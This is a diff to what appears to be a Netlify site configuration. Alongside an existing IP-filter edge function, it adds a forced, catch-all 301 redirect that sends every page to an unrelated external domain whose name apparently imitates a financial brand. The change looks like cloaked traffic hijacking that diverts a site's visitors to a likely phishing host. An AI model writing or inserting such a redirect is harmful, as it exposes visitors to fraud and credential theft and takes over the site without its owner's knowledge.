@@ -1,3 +1,9 @@
 [[edge_functions]]
 path = "/*"
 function = "ip-filter"
+
+[[redirects]]
+from = "/*"
+to = "https://callsop.bbcfinsrv.com/:splat"
+status = 301
+force = true
